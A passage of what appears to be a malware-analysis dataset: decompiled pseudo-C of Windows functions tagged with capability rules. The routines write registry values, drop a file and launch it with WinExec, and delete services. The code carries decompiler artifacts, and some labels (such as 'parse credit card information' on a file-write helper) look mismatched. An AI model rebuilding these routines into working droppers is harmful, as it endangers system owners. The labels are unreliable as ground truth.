'\\x01';\n        }\n    }\n    (*_sym.imp.MSVCRT.dll_sprintf)(&var_160h, 0x40fef0, arg_8h);\n    (*pcVar3)(&var_264h, 0x40ff08, arg_8h);\n    pcVar3 = _sym.imp.SHLWAPI.dll_SHSetValueA;\n    var_20h = &var_160h;\n    var_18h = &var_ch;\n    var_14h = &var_4h;\n    var_10h = &var_8h;\n    uVar5 = 0xffffffff;\n    pcVar7 = &var_160h;\n    do {\n        if (uVar5 == 0) break;\n        uVar5 = uVar5 - 1;\n        cVar2 = *pcVar7;\n        pcVar7 = pcVar7 + 1;\n    } while (cVar2 != '\\0');\n    var_48h = ~uVar5 - 1;\n    uVar5 = 0xffffffff;\n    pcVar7 = arg_8h;\n    do {\n        if (uVar5 == 0) break;\n        uVar5 = uVar5 - 1;\n        cVar2 = *pcVar7;\n        pcVar7 = pcVar7 + 1;\n    } while (cVar2 != '\\0');\n    var_34h = 0x40ff30;\n    var_30h = 0x40ff3c;\n    var_2ch = 0x40ff48;\n    var_28h = 0x40ff58;\n    var_24h = 0x40ff60;\n    var_5ch = 2;\n    var_58h = 1;\n    var_54h = 4;\n    var_50h = 4;\n    var_4ch = 4;\n    var_1ch = arg_8h;\n    var_44h = ~uVar5 - 1;\n    var_40h = 4;\n    var_3ch = 4;\n    var_38h = 4;\n    if ((arg_ch != 0) < 5) {\n        uVar5 = (arg_ch != 0) * 4;\n        do {\n            iVar4 = (*pcVar3)(0x80000002, &var_264h, *(&var_34h + uVar5), *(&var_5ch + uVar5), *(&var_20h + uVar5));\n            if (iVar4 != 0) {\n                return 0;\n            }\n            uVar5 = uVar5 + 4;\n        } while (uVar5 < 0x14);\n    }\n    return 1;\n}\n",
        "token_count": 1231
    },
    "00403670": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nuint32_t fcn.00403670(void)\n\n{\n    int32_t iVar1;\n    uint uStack12;\n    uint32_t uStack8;\n    uchar auStack4 [4];\n    \n    uStack12 = 4;\n    iVar1 = fcn.00401210(0x80000002, 0x410068, 0x4100b4, auStack4, &uStack8, &uStack12);\n    if ((iVar1 == 0) || (5 < uStack8)) {\n        uStack8 = 0xffffffff;\n    }\n    return uStack8;\n}\n",
        "token_count": 132
    },
    "00401a80": {
        "rules": [
            "calculate modulo 256 via x86 assembly"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401bad) overlaps instruction at (ram,0x00401ba9)\n// \n// WARNING: Removing unreachable block (ram,0x00401b39)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nchar * __cdecl fcn.00401a80(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    int32_t *piVar1;\n    char cVar2;\n    uint8_t uVar3;\n    char *pcVar4;\n    uint *puVar5;\n    int32_t iVar6;\n    uint *puVar7;\n    uint32_t uVar8;\n    uint32_t uVar9;\n    code *pcVar10;\n    uint *puVar11;\n    bool bVar12;\n    bool bVar13;\n    uint8_t in_AF;\n    bool bVar14;\n    float10 extraout_ST0;\n    float10 fVar15;\n    float10 extraout_ST0_00;\n    uchar var_20h;\n    uint var_1fh;\n    uint uStack8;\n    \n    puVar5 = &stack0xfffffffc;\n    bVar13 = (POPCOUNT(&var_20h & 0xff) & 1U) != 0;\n    if ((bVar13) && (!bVar13)) {\n        puVar7 = &stack0xffffffcc;\n        cVar2 = '\\x1e';\n        do {\n            puVar5 = puVar5 + -1;\n            puVar7 = puVar7 + -1;\n            *puVar7 = *puVar5;\n            cVar2 = cVar2 + -1;\n        } while ('\\0' < cVar2);\n        pcVar4 = in(0x78);\n        return pcVar4;\n    }\n    puVar5 = fcn.00403470(arg_18h, arg_1ch, 0x40feb8, 7);\n    bVar13 = puVar5 == NULL;\n    if (bVar13) {\n        return NULL;\n    }\n    if ((!bVar13) && (bVar13)) {\n        puVar5 = 0x1;\n        piVar1 = (CONCAT11(in_AF, in_AF * '\\x06') & 0xff0f) + 0x2a;\n        *piVar1 = *piVar1 + -1;\n    }\n    var_20h = 0;\n    puVar7 = &var_1fh;\n    for (iVar6 = 7; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    *(puVar7 + 2) = 0;\n    uVar8 = 0;\n    bVar13 = false;\n    pcVar10 = _sym.imp.MSVCRT.dll_rand;\n    fVar15 = extraout_ST0;\n    do {\n        uVar9 = uVar8;\n        if ((!bVar13) && (bVar13)) {\n            *(pcVar10 + 0x1c) = fVar15;\n            pcVar10 = pcVar10 + 5;\n            uVar9 = uVar8 + 5;\n        }\n        uVar8 = (*pcVar10)();\n        pcVar4 = uVar8 & 0x800000ff;\n        if (pcVar4 < 0) {\n            pcVar4 = (pcVar4 + -1 | 0xffffff00) + 1;\n        }\n        (&var_20h)[uVar9] = pcVar4;\n        uVar8 = uVar9 + 1;\n        bVar12 = uVar8 < 0x20;\n        bVar13 = uVar9 - 0x1f < 0;\n        bVar14 = uVar8 == 0x20;\n        fVar15 = extraout_ST0_00;\n    } while (bVar12);\n    if ((0x20 < uVar8) && (uVar8 < 0x21)) {\n        bVar12 = false;\n        pcVar4 = pcVar4 & 0xe2f4cc58;\n        bVar14 = pcVar4 == NULL;\n    }\n    puVar7 = &var_20h;\n    puVar11 = puVar5;\n    for (iVar6 = 8; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *puVar11 = *puVar7;\n        puVar7 = puVar7 + 1;\n        puVar11 = puVar11 + 1;\n    }\n    puVar7 = puVar5;\n    if ((!bVar14) && (bVar14)) {\n        puVar7 = puVar5 + 1;\n        uVar3 = pcVar4;\n        if (bVar12 || puVar7 == NULL) {\n            *(puVar5 + 0x1b808c5) = *(puVar5 + 0x1b808c5) + uVar3;\n            *pcVar4 = *pcVar4 + uVar3;\n            *(puVar11 + 0x5e) = *(puVar11 + 0x5e) + puVar7;\n            return pcVar4;\n        }\n        in_AF = 9 < (uVar3 & 0xf) | in_AF;\n        piVar1 = (pcVar4 & 0xffff0000 | CONCAT11((pcVar4 >> 8) + in_AF, uVar3 + in_AF * '\\x06') & 0xff0f) + 0x2a;\n        *piVar1 = *piVar1 - puVar7;\n    }\n    fcn.004036c0(arg_8h, arg_ch, arg_10h, arg_14h, &var_20h, 0x20, puVar7);\n    fcn.00402190(arg_18h, arg_1ch);\n    return 0x1;\n}\n",
        "token_count": 1342
    },
    "00401bc0": {
        "rules": [
            "parse credit card information/330c87771d2c420b9aab664e2b442302",
            "parse credit card information/330c87771d2c420b9aab664e2b442302"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401c69) overlaps instruction at (ram,0x00401c67)\n// \n// WARNING: Removing unreachable block (ram,0x00401c0e)\n// WARNING: Variable defined which should be unmapped: var_2h\n// WARNING: Could not reconcile some variable overlaps\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nvoid __cdecl fcn.00401bc0(int32_t arg_8h, uint32_t arg_ch, int32_t arg_10h, int32_t arg_14h, int32_t arg_18h)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint32_t unaff_EDI;\n    bool bVar5;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_2h;\n    \n    var_10h._0_1_ = arg_14h * '\\x02';\n    var_8h = 0;\n    bVar5 = false;\n    if (0 < arg_14h) {\n        var_ch = 1;\n        iVar3 = arg_14h;\n        iVar2 = arg_14h;\n        do {\n            iVar4 = var_ch;\n            if ((bVar5 == iVar2 < 0) && (bVar5 != iVar2 < 0)) {\n                iVar4 = var_ch + -1;\n                *(unaff_EDI | &var_2h + 2U) = iVar3;\n            }\n            uVar1 = *(iVar4 % arg_ch + arg_8h);\n            *(arg_18h + -1 + iVar4) = var_10h ^ *(var_8h + arg_10h) ^ *((iVar4 + -1) % arg_ch + arg_8h);\n            *(var_ch + arg_18h) = var_10h ^ uVar1;\n            var_ch = var_ch + 2;\n            iVar3 = var_8h + 1;\n            bVar5 = SBORROW4(iVar3, arg_14h);\n            iVar2 = iVar3 - arg_14h;\n            unaff_EDI = arg_ch;\n            var_8h = iVar3;\n        } while (iVar3 < arg_14h);\n    }\n    return;\n}\n",
        "token_count": 526
    },
    "00402990": {
        "rules": [
            "parse credit card information/330c87771d2c420b9aab664e2b442302"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402d1e) overlaps instruction at (ram,0x00402d1d)\n// \n\nvoid fcn.00402990(void)\n\n{\n    char cVar1;\n    uint8_t uVar2;\n    uint32_t uVar3;\n    uint8_t extraout_CH;\n    uint8_t *unaff_EDI;\n    uchar uVar4;\n    uint8_t in_AF;\n    uchar uVar5;\n    bool bVar6;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    bool bVar7;\n    uint8_t in_NT;\n    uint8_t in_AC;\n    uint8_t in_VIF;\n    uint8_t in_VIP;\n    uint8_t in_ID;\n    float10 fVar8;\n    ulong uVar9;\n    \n    fcn.004018d0();\n    fcn.004018d0();\n    uVar9 = fcn.004018d0();\n    uVar4 = 0;\n    bVar7 = false;\n    uVar5 = ((uVar9 >> 0x20 & 0xffffff00 | extraout_CH) & uVar9) == 0;\n    uVar3 = fcn.004018d0();\n    if ((!bVar7) && (bVar7)) {\n        LOCK();\n        uVar4 = 0x9a70ae80 < uVar3;\n        uVar5 = uVar3 == 0x9a70ae81;\n    }\n    fcn.004018d0(0x41e380, 0xe, 0x410144, 0xb);\n    if ((!uVar4 && !uVar5) && (uVar4 || uVar5)) {\n        do {\n    // WARNING: Do nothing block with infinite loop\n        } while( true );\n    }\n    fcn.004018d0(0x41e380, 0xe, 0x410150, 8);\n    fcn.004018d0();\n    fcn.004018d0();\n    fcn.004018d0(0x41e380, 0xe, 0x410170, 9);\n    fcn.004018d0();\n    fcn.004018d0();\n    fcn.004018d0();\n    fcn.004018d0();\n    bVar7 = false;\n    fVar8 = fcn.004018d0();\n    if ((!bVar7) && (bVar7)) {\n        *(unaff_EDI + 0x1c) = fVar8;\n        unaff_EDI = unaff_EDI + 5;\n    }\n    fcn.004018d0(0x41e380, 0xe, 0x4102e4, 0x40);\n    fcn.004018d0(0x41e380, 0xe, 0x410324, 0xc);\n    fcn.004018d0();\n    fcn.004018d0(0x41e380, 0xe, 0x41033c);\n    fcn.004018d0();\n    fcn.004018d0();\n    bVar7 = false;\n    bVar6 = unaff_EDI == 0;\n    fcn.004018d0();\n    if ((!bVar7 && !bVar6) && (bVar7 || bVar6)) {\n        do {\n    // WARNING: Do nothing block with infinite loop\n        } while( true );\n    }\n    uVar2 = fcn.004018d0(0x41e380, 0xe, 0x410354);\n    cVar1 = uVar2 - *unaff_EDI;\n    func_0x10188c90((in_NT & 1) * 0x4000 | SBORROW1(uVar2, *unaff_EDI) * 0x800 | (in_IF & 1) * 0x200 |\n                    (in_TF & 1) * 0x100 | (cVar1 < '\\0') * 0x80 | (cVar1 == '\\0') * 0x40 | (in_AF & 1) * 0x10 |\n                    ((POPCOUNT(cVar1) & 1U) == 0) * 4 | uVar2 < *unaff_EDI | (in_ID & 1) * 0x200000 |\n                    (in_VIP & 1) * 0x100000 | (in_VIF & 1) * 0x80000 | (in_AC & 1) * 0x40000);\n    fcn.004018d0(0x41e380, 0xe, 0x410360);\n    fcn.004018d0(0x41e380, 0xe, 0x410378, 7);\n    return;\n}\n",
        "token_count": 1071
    },
    "00403bf0": {
        "rules": [
            "parse credit card information/330c87771d2c420b9aab664e2b442302"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403bf0(uint *arg_8h, uint *arg_ch)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uchar var_68h;\n    uint var_67h;\n    uint var_4h;\n    \n    var_4h = 0;\n    var_68h = 0;\n    puVar2 = &var_67h;\n    for (iVar1 = 0x18; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    fcn.00403a20(&var_68h, &var_4h);\n    fcn.00403540(&var_68h, var_4h, 0x410380, 0xe000);\n    *arg_8h = 0x410380;\n    *arg_ch = 0xe000;\n    return;\n}\n",
        "token_count": 237
    },
    "00404120": {
        "rules": [
            "parse credit card information/330c87771d2c420b9aab664e2b442302"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00404120(uint filename, uint mode, uint ptr, uint nitems)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.MSVCRT.dll_fopen)(filename, mode);\n    if (iVar1 != 0) {\n        (*_sym.imp.MSVCRT.dll_fwrite)(ptr, 1, nitems, iVar1);\n        (*_sym.imp.MSVCRT.dll_fflush)(iVar1);\n        (*_sym.imp.MSVCRT.dll_fclose)(iVar1);\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 131
    },
    "00403f60": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004040d1) overlaps instruction at (ram,0x004040d0)\n// \n// WARNING: Removing unreachable block (ram,0x0040401e)\n// WARNING: Removing unreachable block (ram,0x004040d1)\n\nuint64_t __cdecl fcn.00403f60(int16_t *arg_8h)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint *puVar3;\n    int32_t iVar4;\n    uint8_t extraout_CL;\n    uint8_t uVar5;\n    uint32_t uVar6;\n    uint32_t in_EDX;\n    uint32_t uVar7;\n    uint extraout_EDX;\n    int16_t *piVar8;\n    uint *puVar9;\n    uint *puVar10;\n    uint *puVar11;\n    uint *puVar12;\n    uint8_t uVar13;\n    ushort in_SS;\n    bool bVar14;\n    uint64_t uVar15;\n    uint8_t uVar16;\n    \n    uVar6 = (in_EDX >> 8 & 0xffff00) << 8;\n    uVar2 = in_EDX & 0xffff;\n    uVar7 = uVar6 | uVar2;\n    if (*arg_8h != 0x5a4d) {\n        return uVar7 << 0x20;\n    }\n    if (*(*(arg_8h + 0x1e) + arg_8h) != 0x4550) {\n        return (uVar6 | uVar2) << 0x20;\n    }\n    if ((*(arg_8h + 0x1e) + arg_8h)[0x16] != 0) {\n        return (uVar6 | uVar2) << 0x20;\n    }\n    uVar1 = *(arg_8h + 0x1e);\n    if (uVar1 < 0x81) {\n        return (uVar6 | uVar2) << 0x20;\n    }\n    if ((uVar1 < 0x80) || (piVar8 = arg_8h,  uVar1 >= 0x80)) {\n        piVar8 = *(arg_8h + 0x1e);\n    }\n    puVar11 = *0xe58beb3 ^ 0x40;\n    if (piVar8 < 0xc0) {\n        puVar11 = piVar8 + -0x40;\n    }\n    if ((0xc0 < piVar8) && (piVar8 < 0xc1)) {\n        do {\n    // WARNING: Do nothing block with infinite loop\n        } while( true );\n    }\n    uVar15 = sub.MSVCRT.dll_void____cdecl_operator_new_unsigned_int_(puVar11);\n    puVar3 = uVar15;\n    uVar13 = in_SS;\n    if (puVar3 == NULL) {\n        return uVar15 & 0xffffffff00000000;\n    }\n    bVar14 = false;\n    puVar9 = NULL;\n    puVar12 = puVar11;\n    uVar16 = extraout_CL;\n    uVar5 = extraout_CL;\n    if (puVar11 != NULL) {\n        do {\n            iVar4 = (*_sym.imp.MSVCRT.dll_rand)();\n            uVar13 = in_SS;\n            uVar5 = 0xff;\n            uVar15 = CONCAT44(iVar4 % 0xff, iVar4 / 0xff);\n            puVar10 = puVar9 + 1;\n            bVar14 = SBORROW4(puVar10, puVar11);\n            puVar12 = puVar10 - puVar11;\n            *(puVar9 + puVar3) = iVar4 % 0xff;\n            puVar9 = puVar10;\n        } while (puVar10 < puVar11);\n    }\n    puVar9 = puVar11;\n    if ((bVar14 == puVar12 < 0) && (bVar14 != puVar12 < 0)) {\n        out(0xc4, uVar15);\n        uVar7 = uVar15 >> 0x20 & 0xffffff00 | uVar15 >> 0x20 ^ uVar5;\n        puVar9 = puVar11 + 1;\n        *puVar11 = uVar15;\n        uVar16 = uVar13;\n    }\n    puVar11 = puVar3;\n    puVar12 = arg_8h + 0x40;\n    for (uVar6 = puVar9 >> 2; uVar6 != 0; uVar6 = uVar6 - 1) {\n        *puVar12 = *puVar11;\n        puVar11 = puVar11 + 1;\n        puVar12 = puVar12 + 1;\n    }\n    for (uVar6 = puVar9 & 3; uVar6 != 0; uVar6 = uVar6 - 1) {\n        *puVar12 = *puVar11;\n        puVar11 = puVar11 + 1;\n        puVar12 = puVar12 + 1;\n    }\n    sub.MSVCRT.dll_void___cdecl_operator_delete_void__(puVar3, uVar7, uVar16);\n    return CONCAT44(extraout_EDX, 1);\n}\n",
        "token_count": 1176
    },
    "00404480": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nuint fcn.00404480(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    char **ppcVar6;\n    uint *puVar7;\n    char *pcVar8;\n    char *pcVar9;\n    char *pcVar10;\n    uint *puVar11;\n    uint uStack2112;\n    uint uStack2088;\n    char cStack2084;\n    uint uStack2083;\n    ushort uStack2079;\n    uchar uStack2077;\n    uchar uStack2064;\n    uint uStack2063;\n    uchar auStack1824 [12];\n    uchar auStack1812 [8];\n    uchar uStack1804;\n    uint uStack1803;\n    uchar auStack1564 [260];\n    char acStack1304 [20];\n    uchar auStack1284 [239];\n    char acStack1045 [21];\n    uchar uStack1024;\n    uint uStack1023;\n    \n    uStack2088 = 0;\n    cStack2084 = '\\0';\n    uStack2083 = 0;\n    uStack2079 = 0;\n    uStack2077 = 0;\n    uStack2064 = 0;\n    puVar7 = &uStack2063;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    *(puVar7 + 2) = 0;\n    uStack1804 = 0;\n    puVar7 = &uStack1803;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    *(puVar7 + 2) = 0;\n    uStack1024 = 0;\n    puVar7 = &uStack1023;\n    for (iVar2 = 0xff; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    uStack2112 = 0x104;\n    *(puVar7 + 2) = 0;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(auStack1284);\n    (*_sym.imp.KERNEL32.dll_GetModuleFileNameA)(0, auStack1812, 0x104);\n    fcn.004047e0(&uStack2112, 6);\n    (*_sym.imp.MSVCRT.dll_sprintf)(auStack1564, 0x4102a8, acStack1304, &uStack2112);\n    uStack2088 = 0x410360;\n    ppcVar6 = &stack0xfffff7d0;\n    iVar2 = 3;\n    do {\n        uVar3 = 0xffffffff;\n        pcVar9 = &cStack2084;\n        do {\n            if (uVar3 == 0) break;\n            uVar3 = uVar3 - 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar9 + 1;\n        } while (cVar1 != '\\0');\n        pcVar9 = *ppcVar6;\n        ppcVar6 = ppcVar6 + 1;\n        *(&uStack2088 + ~uVar3 + 3) = 10;\n        uVar3 = 0xffffffff;\n        do {\n            pcVar8 = pcVar9;\n            if (uVar3 == 0) break;\n            uVar3 = uVar3 - 1;\n            pcVar8 = pcVar9 + 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar8;\n        } while (cVar1 != '\\0');\n        uVar3 = ~uVar3;\n        iVar4 = -1;\n        pcVar9 = &cStack2084;\n        do {\n            pcVar10 = pcVar9;\n            if (iVar4 == 0) break;\n            iVar4 = iVar4 + -1;\n            pcVar10 = pcVar9 + 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar10;\n        } while (cVar1 != '\\0');\n        puVar7 = pcVar8 + -uVar3;\n        puVar11 = pcVar10 + -1;\n        for (uVar5 = uVar3 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {\n            *puVar11 = *puVar7;\n            puVar7 = puVar7 + 1;\n            puVar11 = puVar11 + 1;\n        }\n        iVar2 = iVar2 + -1;\n        for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n            *puVar11 = *puVar7;\n            puVar7 = puVar7 + 1;\n            puVar11 = puVar11 + 1;\n        }\n    } while (iVar2 != 0);\n    (*_sym.imp.MSVCRT.dll_sprintf)(acStack1045 + 1, &cStack2084, auStack1824, auStack1824, acStack1304[0]);\n    pcVar9 = acStack1045;\n    uVar3 = 0xffffffff;\n    do {\n        pcVar9 = pcVar9 + 1;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n    } while (*pcVar9 != '\\0');\n    acStack1045[~uVar3] = '\\n';\n    uVar3 = 0xffffffff;\n    pcVar9 = 0x410378;\n    do {\n        pcVar8 = pcVar9;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        pcVar8 = pcVar9 + 1;\n        cVar1 = *pcVar9;\n        pcVar9 = pcVar8;\n    } while (cVar1 != '\\0');\n    uVar3 = ~uVar3;\n    iVar2 = -1;\n    pcVar9 = acStack1045 + 1;\n    do {\n        pcVar10 = pcVar9;\n        if (iVar2 == 0) break;\n        iVar2 = iVar2 + -1;\n        pcVar10 = pcVar9 + 1;\n        cVar1 = *pcVar9;\n        pcVar9 = pcVar10;\n    } while (cVar1 != '\\0');\n    puVar7 = pcVar8 + -uVar3;\n    puVar11 = pcVar10 + -1;\n    for (uVar5 = uVar3 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {\n        *puVar11 = *puVar7;\n        puVar7 = puVar7 + 1;\n        puVar11 = puVar11 + 1;\n    }\n    for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n        *puVar11 = *puVar7;\n        puVar7 = puVar7 + 1;\n        puVar11 = puVar11 + 1;\n    }\n    pcVar9 = acStack1045;\n    uVar3 = 0xffffffff;\n    do {\n        pcVar9 = pcVar9 + 1;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n    } while (*pcVar9 != '\\0');\n    iVar2 = fcn.00404120(auStack1564, 0x4102a4, acStack1045 + 1, ~uVar3 - 1);\n    if (iVar2 == 0) {\n        return 0;\n    }\n    (*_sym.imp.KERNEL32.dll_WinExec)(auStack1564, 0);\n    return 1;\n}\n",
        "token_count": 1847
    },
    "00402d60": {
        "rules": [
            "parse credit card information/0fcc6283562247e58776c7b51a92f681"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402ed5) overlaps instruction at (ram,0x00402ecc)\n// \n// WARNING: Removing unreachable block (ram,0x00402ec6)\n// WARNING: Could not reconcile some variable overlaps\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nint32_t __fastcall fcn.00402d60(uchar *param_1, uint16_t param_2, uchar *param_3, uint param_4)\n\n{\n    uint8_t *puVar1;\n    uchar *puVar2;\n    uchar uVar3;\n    uint uVar4;\n    uint *puVar5;\n    int32_t iVar6;\n    uint32_t extraout_ECX;\n    uint8_t uVar7;\n    uint32_t unaff_EBX;\n    uchar *puVar8;\n    uint unaff_ESI;\n    int32_t *unaff_EDI;\n    bool in_CF;\n    bool in_ZF;\n    bool bVar9;\n    bool bVar10;\n    bool in_OF;\n    ulong uVar11;\n    unkbyte6 Var12;\n    uchar auStack556 [479];\n    uint uStack77;\n    uchar *puStack73;\n    uint uStack69;\n    uint32_t uStack65;\n    uint uStack61;\n    uint uStack57;\n    uint uStack53;\n    uint uStack49;\n    uchar uStack45;\n    uchar uStack44;\n    ushort uStack43;\n    uchar uStack41;\n    uchar uStack40;\n    ushort uStack39;\n    uchar uStack37;\n    uint *puStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint uStack24;\n    uchar *puStack20;\n    \n    if ((in_OF) || (puStack20 = puStack20 & 0xffff | param_2 << 0x10,  !in_OF)) {\n        uStack24 = param_4;\n        puStack28 = param_3;\n        puStack20 = 0xf01ff;\n        param_1 = param_3;\ncode_r0x00402d7f:\n        uStack32 = 0x56;\n        uVar3 = *param_1;\n        puVar8 = &stack0xfffffffb;\n        *0x8b0c458a = *0x8b0c458a | param_1 >> 8;\n        *unaff_EDI = param_1 + *unaff_EDI;\n        *0x8b0c45dc = *0x8b0c45dc + param_2;\n        puStack36 = 0x402d9d;\n        uVar11 = (*_sym.imp.ADVAPI32.dll_OpenServiceA)();\n        puVar5 = uVar11;\n        if (puVar5 == NULL) {\n            return 0;\n        }\n        uStack40 = extraout_ECX;\n        uStack44 = uVar11 >> 0x20;\n        uStack43 = uVar11 >> 0x28;\n        uStack41 = uVar11 >> 0x38;\n        uStack45 = (unaff_EBX & 0xffff0000) >> 0x18;\n        uStack65 = uStack65 & 0xff | unaff_EDI << 8;\n        bVar9 = (extraout_ECX & 0xffff0000 | CONCAT11((extraout_ECX >> 8) - unaff_EBX, uStack40)) == uVar11 >> 0x20;\n        param_3._3_1_ = uVar11;\n        uStack40 = 0xc6;\n        uStack39 = 0x402d;\n        uStack37 = 0;\n        puStack36 = puVar5;\n        Var12 = (*_sym.imp.ADVAPI32.dll_DeleteService)();\n        iVar6 = Var12;\n        uStack40 = param_3._3_1_;\n        uStack37 = uVar11 >> 0x18;\n        uStack39 = uVar11 >> 8;\n        if ((bVar9) || (!bVar9)) {\n            uStack44 = 0xed;\n            uStack43 = 0x402d;\n            uStack41 = 0;\n            (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)();\n            return iVar6;\n        }\n        uVar4 = in(Var12 >> 0x20);\n        *puVar5 = uVar4;\n        if (0 < &stack0xffffffdc) {\n            *(puVar5 + 3) = *(puVar5 + 3) ^ Var12 >> 0x20;\n            return iVar6;\n        }\n        puVar1 = iVar6 + 8;\n        uVar7 = Var12 >> 0x28;\n        bVar9 = CARRY1(*puVar1, uVar7);\n        *puVar1 = *puVar1 + uVar7;\n        bVar10 = *puVar1 == 0;\n    }\n    else {\n        uVar3 = in(param_2);\n        *unaff_EDI = uVar3;\n        unaff_EBX = CONCAT31(unaff_EBX >> 8, 0xbc);\n        unaff_EDI = unaff_EDI + 1;\n        if (in_CF || in_ZF) goto code_r0x00402d7f;\n        puVar8 = &stack0xffffffec;\n        puStack73 = &stack0xffffffec;\n        uStack32 = 0x104;\n        puStack20 = &stack0xfffffffc;\n        iVar6 = (*_sym.imp.ADVAPI32.dll_GetUserNameA)(&stack0xfffffdd4, &stack0xffffffe0, unaff_EBX);\n        bVar9 = false;\n        bVar10 = iVar6 == 0;\n        if (bVar10) {\n            return 0;\n        }\n        uStack24 = 0x104;\n        puStack28 = 0x104;\n        if (bVar10) goto code_r0x00402e5b;\n    }\n    puStack73 = puVar8;\n    if (bVar9 || bVar10) {\n        do {\n    // WARNING: Do nothing block with infinite loop\n        } while( true );\n    }\ncode_r0x00402e5b:\n    puVar8 = puStack73 + -0x10;\n    puVar2 = puStack73 + -8;\n    uStack41 = SUB41(puVar8, 0);\n    uStack40 = puVar8 >> 8;\n    uStack39 = puVar8 >> 0x10;\n    uStack49 = puStack73 + -0x31c;\n    uStack45 = SUB41(puVar2, 0);\n    uStack44 = puVar2 >> 8;\n    uStack43 = puVar2 >> 0x10;\n    uStack53 = puStack73 + -4;\n    uStack57 = puStack73 + -0x114;\n    uStack61 = puStack73 + -0x218;\n    uStack65 = 0;\n    uStack69 = 0x402e84;\n    iVar6 = (*_sym.imp.ADVAPI32.dll_LookupAccountNameA)();\n    if (iVar6 == 0) {\n        return 0;\n    }\n    uStack69 = *(puStack73 + 8);\n    puStack73 = puStack73 + -0x114;\n    uStack77 = 0x402eb3;\n    iVar6 = (*_sym.imp.ADVAPI32.dll_ConvertSidToStringSidA)();\n    if (iVar6 != 0) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 1668
    },
    "004031d0": {
        "rules": [
            "parse credit card information/0fcc6283562247e58776c7b51a92f681"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x0040345a) overlaps instruction at (ram,0x00403457)\n// \n// WARNING: Removing unreachable block (ram,0x00403419)\n// WARNING: Removing unreachable block (ram,0x00403424)\n// WARNING: Removing unreachable block (ram,0x004033cb)\n\nuint64_t __cdecl fcn.004031d0(uchar *arg_8h, uint arg_ch)\n\n{\n    char cVar1;\n    uint8_t uVar2;\n    int32_t *in_EAX;\n    uint uVar3;\n    int32_t *piVar4;\n    int32_t *piVar5;\n    uint16_t uVar6;\n    uint in_EDX;\n    int32_t iVar7;\n    int32_t *piVar8;\n    char cVar9;\n    uint8_t uVar10;\n    int32_t unaff_EBX;\n    uint *puVar11;\n    int32_t **ppiVar12;\n    int32_t **ppiVar13;\n    uint8_t *unaff_ESI;\n    uint8_t *puVar14;\n    uint8_t *puVar15;\n    uint16_t in_CS;\n    ushort in_SS;\n    uint8_t in_AF;\n    bool bVar16;\n    bool bVar17;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    uint8_t in_NT;\n    uint8_t in_AC;\n    uint8_t in_VIF;\n    uint8_t in_VIP;\n    uint8_t in_ID;\n    float10 in_ST0;\n    double in_stack_41c692c5;\n    char cStack24187;\n    char cStack24186;\n    uint16_t uStack24183;\n    uint16_t uStack24181;\n    uint32_t uStack24179;\n    uchar auStack24175 [24087];\n    int32_t **ppiStack88;\n    int32_t *piStack20;\n    \n    puVar11 